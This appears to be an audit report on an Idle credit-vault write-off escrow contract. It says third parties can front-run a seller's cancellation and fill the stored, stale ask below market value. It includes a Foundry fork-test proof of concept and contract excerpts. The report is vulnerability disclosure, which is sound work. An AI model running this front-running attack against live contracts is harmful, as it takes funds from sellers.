### Title
Stale stored price in `fullfillWriteOffRequest` lets any EOA force-buy escrowed tranche tokens below market when the seller's `deleteWriteOffRequest` is front-run - (contracts/IdleCreditVaultWriteOffEscrow.sol)

### Summary
`IdleCreditVaultWriteOffEscrow.createWriteOffRequest` stores an unbounded, seller-supplied `underlyings` ask price inside `userRequests[msg.sender]` [1](#0-0) . That stored value is later consumed by `fullfillWriteOffRequest`, which is callable by any wallet and only requires `_underlyings >= currentRequest.underlyings` — with no check that the price still reflects tranche value and no epoch-state gate [2](#0-1) . This mirrors the DataEase pattern exactly: an attacker-controllable field persisted at "create" time is later used unsanitized to drive a destructive action (here, irreversible deletion of the request plus forced sale of the escrowed tranche tokens).

### Finding Description
- `createWriteOffRequest` can only be called while `isEpochRunning()` is true [3](#0-2) . After `stopEpoch`, tranche prices change (interest accrual raises them; a `stopEpochWithDuration` loss or default finalization lowers them via `lossRecoveryPriceByEpoch` / `defaultRecoveryPrice`).
- `deleteWriteOffRequest` has no epoch or price check — the seller can cancel at any time [4](#0-3)  — but cancellation is a separate transaction that can be front-run.
- `fullfillWriteOffRequest` never validates that `currentRequest.underlyings` corresponds to current tranche value, and explicitly allows third-party fulfilment [5](#0-4) .

Attack sequence: seller creates a request during epoch N asking `U` underlyings for `T` tranche tokens. Epoch N stops; `virtualPrice` rises (normal epoch with positive APR) so `T` tokens are now worth `U' > U`. The seller submits `deleteWriteOffRequest()` to re-price. An attacker (any EOA — no Keyring/allowlist check exists on this path, confirmed by `testNonKeyringBuyerCanFulfillExistingRequestButCannotWithdraw` [6](#0-5) ) front-runs the delete with `fullfillWriteOffRequest(seller, T, U)`, paying the stale `U`, and receives `T` tokens worth `U'`. The seller receives only `U - fee` [7](#0-6) .

The same forced-execution applies whenever the seller wants to withdraw the offer for any reason (change of mind, borrower rotation, pending default): the stale stored ask is executable by anyone until the delete transaction lands.

### Impact Explanation
Direct theft of the spread `U' - U` from the seller. Concretely, for a 10,000 tranche-token request priced at 10,000 USDC, a 5% epoch interest accrual makes the tokens worth ~10,500 USDC; front-running the seller's cancel nets the attacker ~500 USDC (minus none — fee is borne by the seller). The loss is bounded only by how stale the stored `underlyings` is relative to current tranche price; over long epochs or after write-offs/re-pricing events the gap grows. Broken invariant: "one receipt, one payout at fair value" — the escrowed tokens leave at a price the seller no longer consents to.

### Likelihood Explanation
Requires only (1) a seller with an open request whose tranche value has drifted above the stored ask — guaranteed every successful epoch since `virtualPrice` strictly increases with interest, and (2) a mempool-visible `deleteWriteOffRequest` or a seller who simply leaves the request open past `stopEpoch`. No privileged role, no timing dependency beyond standard front-running available to any EOA or searcher bot. The counter-argument that "the seller set the price" fails because the code provides a dedicated cancel function precisely to revoke that price — the bug is that cancellation can be denied by forced execution at the stale stored value.

### Recommendation
- Gate `fullfillWriteOffRequest` to the current `borrower` (re-read `IdleCreditVault(strategy).borrower()` instead of the cached `borrower` field) or add a seller-signed/permissioned fulfiller list, removing the open third-party execution of a stale quote.
- Alternatively, invalidate stored requests at `stopEpoch` (e.g., record the epoch at creation and require `epochNumber == requestEpoch`, or require `isEpochRunning()` in fulfill), forcing re-pricing after each epoch boundary.
- Optionally add a freshness bound: compare `currentRequest.underlyings` against `_trancheToUnderlyings(currentRequest.tranches)` and reject fulfilment if the stored ask deviates beyond a tolerance.

### Proof of Concept
Foundry fork test extending `test/foundry/IdleCreditVaultWriteOffEscrow.t.sol` (mainnet fork at block 23032567, same setup):

```solidity
function testFrontRunDeleteBuysTranchesBelowMarket() external {
    uint256 requestedTranches = 10000e18;
    uint256 requestedUnderlyings = 10000e6; // stale ask, set during running epoch

    vm.prank(LP);
    escrow.createWriteOffRequest(requestedTranches, requestedUnderlyings);

    // Epoch stops with positive APR: tranche value rises above stored ask
    _stopCurrentEpochWithApr(initialProvidedApr); // helper in the test file
    uint256 newPrice = cdoEpoch.tranchePrice(address(tranche));
    uint256 fairValue = requestedTranches * newPrice / 1e18;
    assertGt(fairValue, requestedUnderlyings, 'tranches now worth more than ask');

    // Seller tries to cancel; attacker front-runs the delete in the mempool
    address attacker = makeAddr('searcher');
    deal(address(underlying), attacker, requestedUnderlyings);
    vm.startPrank(attacker);
    underlying.approve(address(escrow), requestedUnderlyings);
    escrow.fullfillWriteOffRequest(LP, requestedTranches, requestedUnderlyings); // succeeds, no epoch/role check
    vm.stopPrank();

    // Attacker now holds tranche tokens worth fairValue > requestedUnderlyings
    assertEq(tranche.balanceOf(attacker), requestedTranches);
    // Seller's pending delete now reverts — request already force-executed
    vm.prank(LP);
    vm.expectRevert(abi.encodeWithSelector(Is0.selector));
    escrow.deleteWriteOffRequest();
}
```

The test asserts the attacker pays `requestedUnderlyings` while receiving tokens redeemable for `fairValue`, with the difference being the quantified loss extracted from the seller.

  function createWriteOffRequest(uint256 amount, uint256 underlyingsRequested) external nonReentrant {
    // can request write off only when epoch is running
    if (!IdleCDOEpochVariant(idleCDOEpoch).isEpochRunning()) revert EpochNotRunning();
    // cannot request write off with 0 tranche tokens
    if (amount == 0) revert NotAllowed();

    // get tranche tokens from user
    IERC20Detailed(tranche).safeTransferFrom(msg.sender, address(this), amount);
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // update user requests
    userRequests[msg.sender] = WriteOffRequest({
      tranches: currentRequest.tranches + amount,
      underlyings: currentRequest.underlyings + underlyingsRequested
    });
    pendingUnderlyings += underlyingsRequested;
  }

  function deleteWriteOffRequest() external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[msg.sender];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[msg.sender];
    // transfer tranche tokens back to the user
    IERC20Detailed(tranche).safeTransfer(msg.sender, currentRequest.tranches);
  }

  /// @dev this function can be called by any wallet
  function fullfillWriteOffRequest(address _user, uint256 _tranches, uint256 _underlyings) external nonReentrant {
    // get current write-off request
    WriteOffRequest memory currentRequest = userRequests[_user];
    // check if the user has a write-off request
    if (currentRequest.tranches == 0) revert Is0();
    // check if the request matches at least the expected values (borrower can choose to overpay if needed, but not underpay)
    if (currentRequest.tranches != _tranches || _underlyings < currentRequest.underlyings) {
      revert WrongRequest();
    }

    // Existing upgraded escrows can have legacy requests that were never added to pendingUnderlyings.
    pendingUnderlyings -= pendingUnderlyings >= currentRequest.underlyings ? currentRequest.underlyings : pendingUnderlyings;
    delete userRequests[_user];

    IERC20Detailed underlyingToken = IERC20Detailed(underlying);
    // transfer underlyings requested from the fulfiller to this contract
    underlyingToken.safeTransferFrom(msg.sender, address(this), _underlyings);
    // check if the exit fee is set and if so, apply it
    uint256 _exitFee = exitFee;
    uint256 _totFee;
    if (_exitFee > 0) {
      _totFee = (_underlyings * _exitFee) / FULL_VALUE;
      // transfer exit fee to the feeReceiver
      underlyingToken.safeTransfer(feeReceiver, _totFee);
    }
    // transfer the remaining underlyings to the user
    underlyingToken.safeTransfer(_user, _underlyings - _totFee);
    // transfer tranche tokens to fulfiller
    IERC20Detailed(tranche).safeTransfer(msg.sender, _tranches);
